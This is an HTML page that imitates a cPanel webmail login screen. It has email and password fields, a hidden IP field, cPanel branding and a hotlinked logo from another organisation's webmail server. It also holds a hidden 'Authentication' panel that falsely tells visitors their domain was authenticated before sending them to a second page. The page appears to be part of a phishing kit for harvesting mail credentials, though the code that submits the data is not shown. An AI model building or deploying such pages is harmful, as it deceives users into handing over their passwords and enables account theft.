<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Webmail Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap" rel="stylesheet">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>

  <style>
    * {
      box-sizing: border-box;
    }

    #login-page {
      margin-top: 140px;
    }

    body {
      margin: 0;
      padding: 0;
      background: white;
      font-family: 'Open Sans', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      flex-direction: column;
    }

    .hidden {
      display: none !important;
    }

    .container {
      width: 310px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .logo {
      width: 95%;
      margin-bottom: 30px;
    }

    form {
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    label {
      font-size: 14px;
      color: #555;
      margin-bottom: 6px;
      font-weight: normal;
      display: block;
      width: 95%;
    }

    .input-wrapper {
      position: relative;
      margin-bottom: 20px;
      height: 40px;
      width: 95%;
    }

    .email-wrapper {
      margin-bottom: 30px;
    }

    input[type="email"],
    input[type="password"] {
      width: 100%;
      height: 100%;
      padding: 6px 10px 6px 32px;
      font-size: 14px;
      border: 2px solid #ccc;
      border-radius: 4px;
    }

    input::placeholder {
      color: #999;
    }

    input:focus {
      border-color: #0098f0;
      outline: none;
    }

    .input-wrapper img {
      position: absolute;
      left: 10px;
      top: 50%;
      transform: translateY(-50%);
      width: 14px;
      height: 14px;
      opacity: 0.6;
    }

    button {
      background-color: #0098f0;
      color: white;
      border: none;
      font-weight: 600;
      font-size: 14px;
      height: 40px;
      border-radius: 4px;
      cursor: pointer;
      transition: background-color 0.3s ease;
      margin-top: 20px;
      margin-bottom: 20px;
      width: 95%;
    }

    button:hover {
      background-color: #007acc;
    }

    .languages {
      margin-top: 80px;
      font-size: 13px;
      color: #555;
      white-space: nowrap;
      overflow-x: auto;
      text-align: center;
    }

    .auth-section {
      text-align: center;
      padding: 40px 20px;
    }

    .auth-section img {
      width: 180px;
      margin-bottom: 30px;
    }

    .auth-section h1 {
      font-size: 26px;
      margin-bottom: 10px;
    }

    .auth-section p {
      color: #444;
      font-size: 15px;
      margin-bottom: 20px;
    }

    .auth-section a {
      display: inline-block;
      text-decoration: none;
      padding: 10px 16px;
      background-color: #0098f0;
      color: #fff;
      border-radius: 5px;
      font-weight: bold;
    }

    .auth-section a:hover {
      background-color: #007acc;
    }

    .cpanel-logo {
      margin-top: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .cpanel-logo img {
      width: 45px;
      opacity: 0.7;
    }

    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #555;
      text-align: center;
    }

    .footer a {
      color: #0098f0;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <!-- Login Form -->
  <div id="login-page" class="container">
    <img class="logo" src="images/webmail-logo.svg" alt="webmail-logo" />
    
    <form id="login-form">
      <label for="email">Email address</label>
      <div class="input-wrapper email-wrapper">
        <img src="images/icon-username.png" alt="icon-username" />
        <input type="email" id="email" name="email" placeholder="Enter your email address" required />
      </div>      

      <label for="password">Password</label>
      <div class="input-wrapper">
        <img src="images/icon-password.svg.png" alt="icon-password" />
        <input type="password" id="password" name="password" placeholder="Enter your password" required />
      </div>

      <input type="hidden" id="hidden_ip">
      <button type="submit">Log in</button>
    </form>
    
    <div class="languages">
      <b>English العربية &nbsp; čeština &nbsp; dansk &nbsp; Deutsch &nbsp; Ελληνικά &nbsp; español &nbsp; latinoamericano &nbsp; español de España</b>
    </div>

    <div class="cpanel-logo">
      <img src="images/cpanel.svg" alt="cPanel Logo" />
    </div>

    <div class="footer">
      <p>Copyright © 2025 cPanel, L.L.C.</p>
      <a href="#">Privacy Policy</a>
    </div>
  </div>

  <!-- Authentication Landing Page -->
  <div id="auth-page" class="auth-section hidden">
    <img src="https://webmail.gulf.com.pk/cPanel_magic_revision_1658331961/unprotected/cpanel/images/webmail-logo.svg" alt="Webmail Auth Logo" />
    <h1>Authentication</h1>
    <p><strong>Domain</strong><br>has been successfully authenticated</p>
    <a href="index2.html">Sign in to continue</a>
  </div>

</body>
</html>
